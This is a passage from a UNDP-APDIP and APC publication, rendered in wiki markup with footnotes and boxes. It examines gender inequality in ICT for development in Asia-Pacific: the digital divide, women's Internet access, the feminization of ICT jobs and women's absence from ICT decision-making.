Importantly also, women themselves are actively seeking help in building their ICT skills – in rural villages as well as big cities. Significant progress has been made, in Asia-Pacific and elsewhere, examples of which are highlighted in this publication. However, in looking at their impact on the ground, we must also realize that, for the most part, they remain at the level of pilot projects and ad hoc policies. We need to find ways to ensure they are scaled up and adopted in all countries and regions, and reach women everywhere at home and at work, even in remote areas.

It is within this context that I welcome this publication by UNDP Asia-Pacific Development Information Programme (UNDP-APDIP) and the Association for Progressive Communications Women’s Networking Support Program (APC WNSP), placing the discussion of ICTs and gender within a gender equality framework. While acknowledging the benefits, both real and potential, of the much-heralded Information Society, they have moved forward to address the implications of integrating a gender perspective at a national level. What policies need to be put in place? What steps can be taken to expand the reach of good practice examples? It is time we move the discussion from the potential to the reality, and begin an in-depth policy dialogue on how to operationalize the recommendations that have been signed and agreed to by Member States.

At the most recent World Summit on the Information Society (WSIS) in 2005, UNDP-APDIP worked with
UNIFEM South Asia and several other partners to organize a pre-WSIS Summit forum for Civil Society
Organizations (CSOs), academics and leading activists from the country level to dialogue on some of the more pertinent issues we face in charting the way forward. We look forward to greater collaboration with UNDP-APDIP, UN partners, international donors and CSOs to eliminate the inequalities that still define today’s Information Society.

An Information Society is not built by designs and intents but by concrete measurable actions. It is only when global commitments and national policies are translated into meaningful public policy development and implementation, that we can say for certain that we are making progress towards a true Information Society, and genuine e-quality for everyone, both women and men.

The status of women’s access to participation in the Information Society is a microcosm of the larger
society that we live in. It is a startling testament of the sheer mountain of the task that is before us and also how optimism at the highest levels of national policy makers has to be tempered with the harsh realities of the socio-economic and political landscape that is evident in the developing world. It is within this crippling environment that the role of ICTs and their potential for the empowerment of women should be examined to be able to provide concrete and tangible results for the participation of women from all levels of society into the Information Society.

There are notable examples of successes within the region in attempting to push this agenda forward,
but it should also be cautioned that we need to place these pilot projects and ad hoc policies in the
appropriate context. We need to ensure these successes do not detract attention from the actual status of participation of women in the Information Society. In the final analysis, equal participation of women in the Information Society involves attention on issues such as the ability to access, process, create and manage information.

UNDP has always advocated that ICTs have enormous potential, especially in the field of education,
health and commerce. Even more so, it has a critical role in providing an opportunity to democratize
decision-making and enhance the governance processes of women’s rights. However, to ensure we are
able to reap the full potential of the opportunities within this new Information Age, the global community and national policy makers have no other choice but to be proactive about ensuring that the benefits of ICT are equally available to and shaped by women and men.

It is within this vein, that UNDP-APDIP and APC WNSP collaborated on this publication to examine and
discuss the context of ICTs and gender by placing it within the Gender Equality Framework. 

We hope this publication will move the dialogue forward to address the questions of implications of
integrating a gender perspective by realistically examining the state of play across the region.

==What are the Benefits of ICT for Development and What is the Digital Divide?==

Information and Communications Technology (ICT) has no doubt been recognized as a potent force that
can transform the development pace and status of a country. In fact, this is not the first time that
technology is seen to provide the much needed impetus for progress and development. Industrialization
and the establishment of manufacturing and electronic assembly plants, primarily in Asia, and to a large extent in Latin America, have demonstrated how technology alone could influence and drive economies and their respective developmental policies. 

Within the same vein, the developments taking place in the field of ICT have positively enabled and
strengthened the creation, processing, storing and sharing of information as a continuous communication cycle. It provides instantaneous relaying of information to and from any location on the face of the planet at a relatively lower cost than ever before.&lt;ref&gt;See Drake, W., ‘The Rise and Decline of the International Telecommunications Regime’. http://www.ceip.org/files/projects/irwp/pdf/draketelecom.pdf&lt;/ref&gt; The potential benefits for women with the resources to access and use new ICTs are enormous. For society as a whole, ICTs offer immense possibilities for reducing poverty by providing income generating opportunities, overcoming women’s isolation, giving women a voice, improving governance and advancing gender equality. In addition, ICTs have provided various options to increase the reach and speed of communication (see Box 1).

At a macro level, this seems to imply that geographical, social, economic and political borders and
boundaries are made irrelevant in this new information age. However, there is a growing global concern on what is deemed as the ‘digital divide’ – of those who have the capacity and access to information and the ‘information have-nots’.

|'''Information Technology''' (IT) uses computers, which have become indispensable in modern
societies, to process data and save time and effort. IT employs the use of computer hardware and
peripherals, as well as software, and requires computer literacy on the part of its users.

'''Telecommunication Technologies''' include telephones (with fax) and the broadcasting of radio
and television, often through satellites.

'''Networking Technologies''' of which the best known is the Internet, but which has extended to
mobile phone technology, Voice Over Internet Protocol (VoIP) telephony, satellite communications,
and other forms of communication that are still in their infancy. Networking technologies include
the Internet, mobile telephones and cables, Digital Subscriber Line, satellite and other broadband
connectivity.

In addition, it must be noted that the impact of the digital divide on information ‘have-nots’ needs to be contextualized within the reality that women make up the majority of the poor and are part of the deeper end of this divide.&lt;ref&gt;e-Choupal, for example, is a much celebrated initiative. Their agriculture extension efforts in India which seek to improve the productivity of agriculturists are based on the telecentre model. e-Choupal has been critiqued for not involving low-caste farmers.
Women are also not seen as intended beneficiaries of the initiative (Gurumurthy, 2004: p.29).&lt;/ref&gt; The constraints on women’s access, usage and capacity vis-à-vis ICT are similar in many respects regardless of geography. Poverty, illiteracy, lack of education and skills, language limitations and capacity, time constraints, cultural restrictions on mobility in public, and psychological barriers (which are perhaps due to the perception that technology is a male domain) often result in women’s ambivalence and fear towards ICTs. 

==Why does Gender Equality Remain a Missing Agenda in Development?==
Today’s development framework leaves very little room to address issues of equity (which, to a large
extent, demands affirmative action towards women’s empowerment) and gender equality. If a gender perspective and analysis is at all integrated, the main impulse motivating the articulation of concerns with gender are usually limited to promoting growth, reducing poverty and improving productivity (Rose, 1995). The additional concerns of Asian countries on the sustainability of the digital economy have further exacerbated this emphasis.&lt;ref&gt;According to Mitter (2001),  sustainability of the digital economy depends, finally, on a country’s ability to cater to its domestic needs and local traditions; in its absence, export-oriented strategies will only create an enclave or a satellite economy, often referred to as the ‘bubble economy’, that is dependent upon decisions of foreign investors. There is thus, in Asia, justified concern lest that these bubbles burst and ICT-related jobs disappear.&lt;/ref&gt; As trends in negotiations around the World Summit on the Information Society (WSIS) have shown, actions which were proposed prioritize issues of infrastructure, connectivity and access (WSIS Plan of Action 2003&lt;ref&gt;The WSIS Plan of Action can be referred to online at http://www.itu.int/wsis/documents/doc_multi.asp?lang=en&amp;id=1160|0&lt;/ref&gt;). Gender equality advocacy groups had to continuously monitor negotiations and persistently advocate for gender to be recognized as a cross-cutting issue and principle in the final declaration, only to see it whittle down and tied specifically to a paragraph on women as a target group, and after young people (WSIS Declaration of Principles 2003&lt;ref&gt;The WSIS Declaration of Principles can be referred to online at http://www.itu.int/wsis/documents/doc_multi.asp?lang=en&amp;id=1161|0&lt;/ref&gt;). Such narrow definitions discourage a deeper analysis and engagement into the complexities faced by women and girls in exercising their agency in decision-making that affects all spheres of their lives.
Hence, engagement with equity in this respect usually extends only as far as addressing ‘access’, rather than empowerment issues of control, ownership, decision-making and self-determination. A policy study on gender and ICT in the Philippines by WomensHub and the Philippine Legislators Committee on Population and Development (PLCPD) points out that a correlation between the level of human development and the prevalence of ICT access and use exists and that “countries with high human
development indices prove to have high ICT availability. Women’s development, as a highlighted concern of human and sustainable development, must therefore be considered in the planning, implementation, and monitoring of ICT development and utilization in the country.”&lt;ref&gt;Gender and ICT in the Philippines: A Proposed Framework’, jointly-developed by WomensHub and the Philippine Legislators Committee on Population and Development.&lt;/ref&gt;

==Why is There a Need to Incorporate Gender in ICT for Development?==
In order to maximize the potentials of ICT in effecting gender equality and women’s empowerment,
there is a need to not only have a clearer understanding of the concept of gender, but to also consciously integrate a gender perspective in ICT and improve our ability in identifying and analysing gender and ICT issues.

At the outset, while it is acknowledged that most development paradigms do incorporate gender as a
factor, it must be noted that these are primarily and largely as an add-on or as an afterthought. It must also be noted that several developmental agencies have now taken a broad-based approach, whereby
they have placed gender as a cross-cutting thematic area of developmental work.

Gender advocates have long insisted that gender is an integral component in development for the simple reason that persistent and emerging gender issues and inequalities hinder full and equitable
development. A gender-blind framework and approach to development does not take into account
socially constructed inequalities between women and men, as well as between different kinds of women
and different kinds of men, within a community.

Furthermore, the location of gender in development paradigms and initiatives have been mostly in areas that are viewed traditionally as ‘women’s issues’, such as health, and violence within the community and the family. While these issues of concern are important, it is equally important to extend and expand the development framework to include areas and fields that have not included women and gender in the past. In the Philippines, for instance, the review of the government’s ICT policies that was conducted by WomensHub and PLCPD has shown that: “Significantly missing in the many incarnations of the ICT policy initiatives and formulations as well as ICT legislations in the last 10 years is a clear-cut and equivocal commitment to advance the gender equality and women’s empowerment through ICT. The Philippines’ strategic framework for ICT development is silent on gender issues and considerations.”&lt;ref&gt;The four-month review covered (1) National ICT Plans and Strategies from the Ramos Administration to the Macapagal-Arroyo Administration; (2) Major ICT-related Legislations; (3) Conferences and Major ICT-related Covenants and Declaration of Commitments;
(4) Publicly-funded ICT Projects and Initiatives which Promotes Citizen’s Access and Use of ICT; and (5) Pending ICT-related House and Senate Bills. The review’s objective was to find out whether gender equality and women’s empowerment are considerations in the government’s ICT strategies, policies and actions over the last 10 years.&lt;/ref&gt; 

ICTs have long been believed to be gender neutral but, contradictorily, the ICT sector is primarily a male domain. This, in and of itself, is an issue as it dismisses the invisibility of women in the ICT field as a given. ICT for development frameworks and initiatives that do not incorporate gender as a key factor and concern run the risk of widening inequalities between women and men. For example, in attempts to provide universal access to ICTs among rural communities, several development agencies fail to consider women’s particular needs and realities in planning and implementation. Thus, these initiatives tend to be largely tailored towards the needs of men within these communities, a situation that further marginalizes women. Policy makers and even development experts may sceptically ask too, why women living in poverty would need computers? (See Box 2).

!Box 2: Why Women Living in Poverty Would Need Computers
|-
|Why would women living in poverty need computers if they still do not have access to clean
water and other basic goods? This is an interesting debate which is touched upon in the
International Development Research Centre book Gender and the Information Revolution in Africa
by Rathgeber and Adera, but which needs much more exploration. Limited evidence so far
suggests that the poor are willing to spend a significant proportion of their income on ICTs if by
using them they can see real economic benefits. For example, a World Bank report showed that,
in Chile, the poorest sections of society spend as much on telecommunications as on water and
electricity combined (Kenny, ''et al.'', 2000). Another research issue relates to whether the emergent
information society can be seen as a knowledge society.

ICT is an important tool to address women’s basic needs but, more importantly, it also serves as a means for women to lead themselves out of poverty. “Women in poverty may lack education and may be illiterate, but this should not be equated with their lack of wisdom, survival skills or resilience,” stressed Usha Reddi, Director of the Commonwealth Educational Media Centre for Asia. Women must be enabled to use ICT effectively within a social, economic and cultural fabric that has consistently disallowed this. Digbijoy Bhowmik of i4d said, “it must be kept in mind that the need for information and communication precedes the need or substantiation of technology.” &lt;ref&gt;Please visit http://www.dgroups.org/groups/GenderICT/docs/GenderIctReport.doc for full summary report of the i4d-hosted online discussions on ‘Gender and ICT: Issues, Implications &amp; Opportunities’.&lt;/ref&gt; In other words, the need for information, knowledge and communication and the means by which these are provided cannot be considered at the same level of priority, as these needs existed long before ICT. ICT must remain as the means to this end. 

Application of ICTs by women’s rights activists in small-scale projects has shown that such technologies enable a woman to seek safe spaces in the form of information, knowledge and community. ICTs provide women the ability to make informed choices in relation to political, economical or social issues that affect their lives. If a gender perspective and analysis is not integrated from the beginning into national ICT policies while nations are either still trying to develop these or have yet to start, women and girls risk experiencing disempowering gender relations of a greater intensity and being impoverished even further.

{{TextBox|1=''…in no region do women enjoy equal legal, social, and economic rights. Women have fewer resources than men, and more limited economic opportunities and political participation. Women and girls bear the most direct cost of these inequalities—but the harm ultimately extends to everyone. . . Gender inequalities persist because they are supported by social norms and legal institutions, by the choices and behaviours of households, and by regulations and incentives that affect the way economies function. A strategy to reduce gender inequalities must address these factors. Foremost among the costs of gender inequality is its toll on the quality of human lives. Evidence suggests that societies with large and persistent gender inequalities pay the price of more poverty, illness, malnutrition, and other deprivations, even death. This makes a compelling case for public and private action to eliminate inequality. Public action is particularly important, since many social, legal, and economic institutions that perpetuate gender inequalities are extremely difficult for individuals to change.''

==Gender Neutrality of Technology – Pure Science Fiction==

The application of the technology and who uses it make ICT extremely gendered. However, in reality,
gender issues are not holistically addressed in the application of ICT. The way ICT is applied today has largely been an extension of our socialization – an extension of the provision of basic services and an extension of our efforts to promote efficiency, productivity and cost-effectiveness. Generally, the way ICT is applied today has little to do with the appreciation of the individual and the richness in diversity s/he brings to a society and the multiple identities and roles that the individual plays within that society.

The way ICT is applied today makes little difference in addressing gender (Kuga Thas, 2003).
Traditionally, women have had a subordinate position to men, where, for example, she may contribute
materially to the household but her husband makes the decisions on how the income is spent. On a
macro-political level, most governing bodies are dominated by men; legislative and judicial decisions
often lack a gendered perspective and do not represent women’s interests. ICT access and use may be
similarly restricted: at the micro-level, the son’s preferences may translate into allowing boys greater access than their sisters to the family computer; at the macro-level, supposedly ‘gender-neutral’ ICT policies regarding education, training and price structure may have an unintended negative impact based on gender roles and access to ICT resources. 

In the context of ICT, it is necessary to consider how ICT impact women’s multiple roles and examine 
changes brought about by the new information and communication society on women’s and men’s gendered roles. Gender role analysis is useful to understanding to what ends women and men utilize ICT (i.e. reproductive tasks associated with educating children, productive tasks associated with work, and community tasks associated with volunteerism), whether use of ICT is time-saving, and whether women’s and men’s use of time is different (i.e. does one sex have greater leisure or does increased time
flexibility create the potential for more ‘double shift’ as telecommuting blurs distinctions between private (home) and public (work) domains).

In terms of ICT use and impacts, examining gender roles may lead to greater understanding of the
differences between women and men in ICT use and impacts. For example: 
*In a given community, do women and men, girls and boys, participate equally in the use of Internet facilities at a library or telecentre? At the telecentres, are men visiting pornographic sites and making the environment uneasy for women to remain within? 
*In a development organization, is there a gender difference among those who use/appropriate email and those who do not? Is a general public email account assigned to lower category staff who are usually women compared to private email accounts of top management who are usually men?
*Does the availability of a home computer facilitate work management through telecommuting, or does it create unrealistic time demands because the worker – female or male – is always connected? Are both women and men who telecommute paid equal wages for equal work or do wage differentials still exist?
*Are women, when telecommuting, often disrupted just because they are working at home, while men are generally left to do their work without disruption just as they would be at an office? Do female workers’ time demands increase or decrease?
*Are national policies being designed in such a manner to encourage telecommuting only for women, with the presumption that all women would prefer to work from home as they would want to take care of the children and household? Do such policies work against encouraging men to share household responsibilities? Do such national policies prioritize incentives to the private sector as they will not have to pay for various insurance and health benefits?&lt;ref&gt;Women’s ability to work is significantly shaped by the availability of childcare, flexible work hours, and maternity leave. While in many countries, governments mandate that employers provide for these benefits, the extent to which these are actually provided relies heavily on the decisions of the employer, which are more often than not, guided by actual costs incurred as well as opportunity costs.&lt;/ref&gt; 

Will such policies effectively remove women’s opportunities to go outside of the home? Will such policies unknowingly exacerbate existing situations of domestic violence?

The questions above as one can see are not just limited to the issue of an equal number of women and
men using ICTs. They must include issues that ‘interfere’ with not only family matters, but cultural matters as well. Projects that say they address gender inequalities therefore, need to look beyond the surface of the immediate problem (see Figure 1). Projects cannot run away from ‘interfering with family and cultural matters’ because when gender inequalities are addressed, the whole issue of socialization of values, of what is feminine and masculine, and the power dynamics between the two socialized concepts need to be examined and analysed.

The fact remains that opportunity costs of forgoing girls’ labour are often high, particularly relative to boys’, given the gender division of labour within the household. Girls are more likely to be ‘employed’ in the household, whereas boys are often not considered old enough to contribute to productive labour (Bhatty, 1998). Thus, the opportunity costs of empowering women and girls at all stages are high for a household to bear. It is only when this ‘empowerment’ is accompanied with an income value to the household that a valuation of their contributions changes to one of reasonable acknowledgement. Gender is therefore a consistent variable in decision-making at the household, and reinforced in a vicious circle by the larger society not only through tradition, beliefs and practices, but through various institutional structures and mechanisms which include those of the State. These usually result in women and girls facing gender-specific disadvantages arising from the specific construction of femininity. 

Women are also constantly reminded about what they should or should not be interested in, and where their capabilities and strengths lie. For example, the Newsweek magazine, regularly trumpets studies finding gender-related mental differences while ignoring the (far more common) studies which finds no differences at all (Henson, 2002). Dismissive explanations such as ‘women just aren’t interested in
computers’ or ‘women aren’t as smart as men’, implicitly reinforce the stereotypical mentality that women are genetically pre-determined from conception to not be interested in computers.&lt;ref&gt;Sceptics are constantly amazed at how illiterate women, if taught effectively, can quickly learn how to use the computer. For example, on 23 March 2000, an illiterate woman launched the e-governance programme in Rajasthan in Nyala village in the presence of the ex-US President Bill Clinton. Kailashi Devi was tutored over two days to operate an ICT-based system, clicked on Rajasthan Government’s site and showed President Bill Clinton the immunization card of the health department (see http://www.rediff.com/news/2000/mar/24josy.htm for details). Clinton, impressed that an illiterate village woman could retrieve information on neo-natal care from the Internet, later stressed at the need for similar community centres all over the Mississippi Delta.&lt;/ref&gt;This ‘just aren’t’
theory has been used in many other fields when women first began entering them, from education to
medical science to even joining the armed forces. Even if women are able to acquire better education and training and begin to enter ICT fields in greater numbers, women’s leverage within the ICT job market may be undercut by the feminization of certain ICT occupations whereby “large numbers of women enter a profession and as a result, there is a drop in salaries, status and working conditions” (Hersh, 2000). As Reardon warns, “as computer-based skills become more commonplace, and as the need for more workers to use them in a greater variety of ways grows, more women will again be recruited. But this will be at a lower wage because these will no longer be considered specialist skills, merely something that women can do” (Reardon, 1998).&lt;ref&gt;Certain kinds of work, because they are historically performed by women, have come to be defined as ‘unskilled’ (and therefore lowpay).
Effective call service often requires a great deal of performative or emotional labour, but such labour is naturalized as ‘inherent’ to women and therefore undervalued (Costanza-Chock, 2003: pp.11-12).&lt;/ref&gt; Feminization has plagued other sectors, perhaps with the exception of law and medicine, and Hersh raises the question of how engineering and ICT professions can be opened up to women and “become a genuinely gender neutral profession without a resulting drop in salaries and status” (Hersh, 2000).

A cornerstone of gender equality is women’s equal participation in decision-making. Collective
participation is also one of the essential aspects of women’s empowerment. Participation in decision making is integrated with ‘conscientization’, process of awareness raising among women about gender
discrimination and the resulting oppression it creates for women as a social group. Through this process, women collectively analyse various aspects of gender inequality that they face. This process constitutes women’s development and becomes the basis for action to overcome and dismantle gender inequality in control of resources. Achieving control is an essential element of women’s empowerment that includes the ability to direct and/or influence events to protect one’s own interests. Control makes it possible for women to ensure that resources as well as the benefits that the use of these resources can bring are distributed so that women and men get equal shares. This framework is particularly useful in understanding and evaluating the impact of women’s access to ICTs. Gender gaps in access to ICT resources and services remain an obstacle to women’s empowerment (see Box 3).

{| class=&quot;wikitable&quot;

!Box 3: The Same Old Story?
|-
|While efforts are underway to increase ICT access, improve capacity and enable usage for all – or
at least for more – questions are arising about how well those efforts are reaching women in
developing countries. It’s the same old story, in some ways, with a high tech twist. Early returns
suggest that women are neither participating in nor benefiting from the efforts at anywhere near
the same level as men. The familiar and still formidable constraints are again rearing their ugly
heads – poverty and illiteracy, lack of time, insufficient skills – with ‘technophobia’ and maledominated, corporate control of technology added to the list. Accompanying the questions and
constraints are the continuing debates about the relative value of ‘Women in Development’-type
initiatives vs. ‘gender mainstreaming’ as responses. Noteworthy progress notwithstanding, after a
quarter of a century of exploring, analysing, debating and experimenting with approaches to
meeting women’s development needs, one still faces daunting difficulties and dilemmas when it
comes to striving for gender equity.

In investigating the impact of ICT and development on gender equality, it is essential to trace the factors that govern its production, consumption, distribution and appropriation. Women and men traditionally have different levels of access to and control over resources, whether they exist in the private or public spheres.

==Where are Women in the Globalized Information and Communication Society?==

In a globalized&lt;ref&gt;Globalization (also frequently referred to as global restructuring to emphasize its social aspects) (Marchand and Runyam, 2000) refers to the phenomenon that emerged in the 1970s involving the spatial reorganization of production, movement of industries across borders, and spread of financial markets that resulted in flexible production methods and integration of production into global commodity and production chains. “Businesses could treat the whole world as their field of operations and re-deploy their capital and move the location of their production at will” (UNIFEM, 2000).&lt;/ref&gt; world where international trade and financial systems have become so dependent on ICTs, it has become an arena that women cannot afford to not be a part of. Despite being a very new field
in most developing countries, the ICT sector is already being entrenched with gender inequities that are so well-ingrained in other sectors, from gender employment patterns and gender stereotyped division of labour to gender role biases. These could take the form of preference for male workers because of the perceived physical demands of the job or the perceived higher level of skills and experiences which are in turn due to men having easier access to more opportunities, or the provision for differentials in salaries due to the man being perceived as the main breadwinner of the household. Women tend to be poorly represented as administrators and managers and concentrate in lower level, end user positions. On a higher level of skills, women tend to be well represented in desktop publishing and software programming, but not in hardware design, operating systems or computer maintenance. Swasti Mitter says that, “technological innovations become commercially successful if and when the creator of the innovation could make use of political, economic and legal networks. Thus the dominant group in a society determines the shape and direction of a society’s techno-economic order - and the image of an inventor has almost always been male. Lack of access to relevant networks in the public domain explains the historical marginalization of women’s contribution to technological innovations” (Sarkar, 2003). Unfortunately, it is a reality that women are not seen or encouraged to be ‘creators’ but rather more as ‘consumers’ of ICTs.&lt;ref&gt;In the case of consumer applications, the international private sector is attempting to capture women’s purchasing power while clothing its efforts, in the language of gender and ICT advocates, as ‘empowering women’, but clearly targeting women who have significant amounts of disposable income (Hafkin and Taggart, 2001: p.19).&lt;/ref&gt; 

===Access to ICT, Women’s Use and Challenges===
Nancy Hafkin and Nancy Taggart (2001) in their document entitled Gender, Information Technology, and
Developing Countries: An Analytic Study provides valuable insights as to where women are in the still
defining globalized information and communication society. In their review of available sex-disaggregated statistics/data on Internet use, which had to be sourced from marketing surveys and ad hoc research projects,&lt;ref&gt;As the International Telecommunication Union did not have sex-disaggregated data, other sources that did have sex-disaggregated data had to be sought out and used.&lt;/ref&gt; the authors found the figures by country puzzling as there did not appear to be any correlation between women’s Internet usage and expected indicators such as female literacy rate, female GDP per capita, female representation in professional and technical jobs, or even gender empowerment. Nor were there regional patterns to women’s use.
No correlation could be found in developing countries either between a high percentage of users overall and a high percentage of women users, as there is in the developed world such as in the USA and Japan (Hafkin and Taggart, 2001). This lack of correlation supports the hypothesis that many women Internet users in almost all developing countries are not representative of women in the country as a whole, but rather are part of a small, urban educated elite. A study by Asian Women’s Resource Exchange (AWORC) on gender and ICT issues in the Asia-Pacific confirms this (Ramilo and Villanueva, 2001). Figures of relatively high (e.g. 30 percent or more) women’s Internet use as a percentage of total users per country can be misleading when Internet access is confined to a tiny elite of high-income urban dwellers. This urban elite centricity is particularly true for countries like the Philippines and Malaysia, where the latter boasts of extremely good telecommunication infrastructure. Figures by the Internet World Stats show that Asian Internet users as at the end of June 2006 experienced a growth of over 232 percent and represent 36.5 percent of global users, but penetration (percentage of global population) is only 10.4 percent (see Table 1). By regions, in 2004, women were 22 percent of all Internet users in Asia, 38 percent in Latin America, and 6 percent in the Middle East. No regional figures by sex were available in Africa. In the two latter regions, less than one percent of the total population was connected to the Internet.&lt;ref&gt;According to Nua Internet Surveys (http://www.nua.ie/surveys/how_many_online/), the art of estimating how many are online throughout the world is an inexact one at best. Surveys abound, using all sorts of measurement parameters. However, from observing many of the published surveys over the last two years, here is an ‘educated guess’ as to how many are online worldwide as of September 2002; the number is 605.60 million globally, with 6.31 million in Africa, 187.24 million in Asia and the Pacific, 190.91 million
in Europe, 5.12 million in the Middle East, 182.67 million in Canada and the USA, and 33.35 million in Latin America. Since accessing this data in 2005, it is now only available to subscribers, see http://www.gdsourcing.com/statslinkcanada/IndexFreeE.asp#I&lt;/ref&gt; 

Unfortunately, there are no comprehensive surveys that document all the uses women make of ICT in
developing countries. However, the early adapters of the technology in developing countries were nongovernmental organizations (NGOs) working on women’s rights and empowerment issues on behalf of
women. This was clearly the case when women mobilized around the world in preparation for and in
their actual participation at the Fourth World Conference on Women in Beijing in 1995. In these cases
and in the cases of women entrepreneurs in small- and medium-sized enterprises (SMEs), women are
using ICTs to make their organizations and businesses more efficient and effective. Where these groups of women are concerned, women have strived to be their own agents of change and decision-making, ensuring that the technology serves them.

However, while the AWORC study acknowledges that the rate of increase in the use of ICTs by women’s
organizations have been rapid, women’s full access to the benefits of ICTs have largely been for
administrative purposes (Ramilo and Villanueva, 2001). These findings seem to imply that women’s use
of ICTs is driven by their practical realities and needs, which may or may not directly challenge gender inequalities and/or inequities within the local context. The experience of Projek Ikhtiar, however, does suggest that while women are driven by their practical realities and needs, they will be unable to fulfill these needs effectively if gender issues on control and decision-making remain unaddressed.&lt;ref&gt;See Gibbons, D. S. and Kasim, S. 1990 for more details.&lt;/ref&gt;

Another prominent challenge is the lack of relevant local content and the continued predominant use of English, which makes ICT seem highly irrelevant to many women in the Asia-Pacific region, and much of the developing world. Women continue to be more inclined towards ICTs that are more audio in nature, such as the radio and even the mobile telephone.&lt;ref&gt;Grameen Phones in Bangladesh is another example where women with low levels of literacy can still effectively adopt new ICTs in their lives. The experience such as that of Grameen Phones further testifies that women’s illiteracy should not be equated to their lack of wisdom, survival skills or of resilience. For more information on Grameen Phones please visit http://www.opt-init.org/framework/pages/appendix2Case2.html. See also Bayes, A., von Braun, J., Akhter, R. 1999. ‘Village Pay Phones and Poverty Reduction: Insights from a Grameen Bank Initiative in Bangladesh’. ZEF-Discussion Papers on Development Policy No. 8, Center for Development Research, Bonn, May, p.47. http://www.telecommons.com/villagephone/Bayes99.pdf&lt;/ref&gt; For example, recognizing the relevance of radio and its proliferation as a reality in most women’s lives, especially those who are not employed outside of the homes, the Women’s Aid Organization (WAO) in Malaysia focused its public education strategy on providing awareness and information on basic rights to women, through the radio. WAO targets non-Malay or non-English speaking audiences whom, through experience at the WAO Refuge, were either short of time or had costs and literacy obstacles in gaining information through print media, television or new forms of ICT. Working through the radio has been very successful as the number of phone calls to the Refuge invariably increases whenever there is a programme aired (Kee, 2004). Hence, community media centres which promote women’s issues and content can be an effective approach to providing development solutions but within a gender equality framework.

Mainstream media can also be encouraged to host gender transformative and women-centered programmes.&lt;ref&gt;WAO has successfully partnered with both mainstream radio stations and the web-based radio station, Radiqradio.com. However, it took NGOs in Malaysia more than a decade to get the Domestic Violence Act enacted before issues of domestic violence started to be taken up more readily by the mainstream media.&lt;/ref&gt; Women prefer technology that is audio in nature not purely because they are illiterate or semi-literate, but largely because they do not speak English, the predominant language of the Internet and the new knowledge-based economy. A cheaper alternative in telephony that is now available is VoIP, which unfortunately is not allowed in many countries because it affects the profits of telecommunication monopolies (Sprigman and Lurie, 2004).&lt;ref&gt;Telkom, a formerly state-owned monopoly and the owner and operator of South Africa’s telephone network, was privatized between 1997 and 2003. Despite enjoying an advanced network backbone, Telkom does not offer basic telephone service to a majority of South Africans. As it depends on revenues from phone calls, Telkom has little incentive to offer cheap VoIP service. South African law dictates that only Telkom and ‘under-serviced area licensees’ (small firms in rural areas) are allowed to offer VoIP, yet the government has not approved a single under-serviced area licensee. So today, for a variety of regulatory reasons, only Telkom can provide VoIP. For competitive reasons, it does not. (Sprigman and Lurie, 2004).&lt;/ref&gt;

While ICTs include a variety of technologies, the Internet has proved the most innovative and fastestgrowing new technology. This network of networks has become critically important in the development of the new information and/or knowledge society, contributing to the development of what many are now calling the new knowledge-based global economy. Many of the more traditional ICTs such as radio and television broadcasting are converging on the Internet, using it, becoming part of it, and often becoming indistinguishable from it (APC, 2003). In our race to be part of the new knowledge-based economy, it is imperative that governments substantially consider that in many cultures, women have been at the core in safeguarding and passing on traditional knowledge and wisdom. While the recording of this traditional knowledge and wisdom is still done with the use of speech, drama, painting, song or dance, the use of writing and the invention of the printing press has changed information and communication means tremendously.

The knowledge, culture and tacit skills of women should be respected and enhanced through the use of
ICTs, thereby enabling a better preservation and transference of traditional knowledge, wisdom and
skills. It is also equally important to ensure that the tacit and uncodified knowledge of women, and the material resources of their traditional use in the household and in micro and small businesses, are not appropriated by the corporate sector in the developed world. Codification and digitization of women’s knowledge should not lead to patenting, a trend that could deprive rural and semi-literate women of their livelihoods and ways of life. Instead of an intellectual property regime that privatizes knowledge, an inclusive knowledge society must fully embrace women’s knowledge including knowledge that is contextual, rooted in experience and practice, and draws from local knowledge. In addition, it means ensuring that the information needed by specific communities is generated, and that accessing society’s knowledge is possible and affordable to all.

=== Trends in the ICT Sector and Gender Implications ===

The perception of women being passive consumers of ICT rather than producers extends to their work related use as well, where one continues to see a feminization of lower level ICT jobs and women in a
more reactive role of receivers of ICT-type jobs. Women continue to be concentrated in tedious, repetitive tasks as when they were during the first wave of industrialization, in manufacturing sectors such as textiles, clothing and electronics. The lower skilled ICT jobs that women typically find themselves in are word-processing and data entry. Trends and dynamics of global job distribution have also seen women taking up more social-related ICT jobs such as working in particular divisions of the call centres industries, information-processing, banking, insurance, finance, printing and publishing, where skilled requirements are relatively lower than in software development. The entry of women in the new technology service sector is not only recent, but there are fewer jobs numerically compared to those that had been created in manufacturing.

Women’s employability status has also considerably weakened as women who had lost manufacturing
jobs were generally not qualified and unskilled to enter into the new service industry. The service jobs show a preference for young women, familiar with English, single and better-educated than those who had worked in manufacturing. In call centres in the Philippines, employees – both women and men –
commonly recount that they are trained to speak in an American accent, and are even expected to
handle emergency calls which get redirected to these call centres outside of the country concerned
(interviews conducted by WomensHub, Philippines).

Women tend to represent a very small percentage of managerial maintenance, software developers, or
design personnel in operating systems and networks. Summarizing the results of the United Nations
University / Institute for New Technologies project on Monitoring the Impact of Technological Changes in Women’s Employment in Asia, Swasti Mitter (in Ng and Kua, 1995) concludes that the introduction of new technologies has changed women’s work in three ways by:

# Altering the process of production in manufacturing and service industries through automation, de-skilling of workers and augmenting the skills requirements of key jobs;
# Introducing new products or services in the market, such as electronics, computer peripherals or information processing work; and
# Shifting production that often used old technologies to locations that are distant from the main sites of commercial units or to home-based workers.

Evidence also indicates that women are conspicuously absent from decision-making structures in ICT in
developing countries. These structures include boards and senior management of private IT companies,
senior management and advisors of international policy and regulatory organizations, technical
standards-setting organizations and industry, and professional organizations. In line ministries of
developing countries, out of 201 senior government officials responsible for ICTs in developing countries, only 11 are women (5.5 percent). Although the numbers are miniscule, it is notable that there are more women in senior government positions related to IT in Africa than in other regions.&lt;ref&gt;Nancy Hafkin and Nancy Taggart compiled these figures from lists of senior government officials from developing countries using the ITU Global Directory, 2001.&lt;/ref&gt;
Women’s representation is also very low in International Trade Union Study Groups, which are able to
influence the direction of the development of information and communication infrastructure and
standards in developing countries. Likewise, women from developing countries are absent among the
19 directors who sit on the board of the Internet Corporation for Assigned Names and Numbers (ICANN),
the non-profit corporation that assumes responsibility for Internet address space allocation and related matters, and is therefore a major decision-making body and player in the Internet world. Women in key decision-making positions in ICT have the potential to influence how ICT is allocated, applied and developed in their countries as well as at regional and international levels. These women are able to facilitate the entry of other women into the arena and alleviate some negative impacts of the technology on women and girls.

Despite the appalling statistical scenario of women and ICT use, and its ‘easy-to-miss’ implications on women’s employability, women have taken on leadership roles in technology, debunking the ‘women
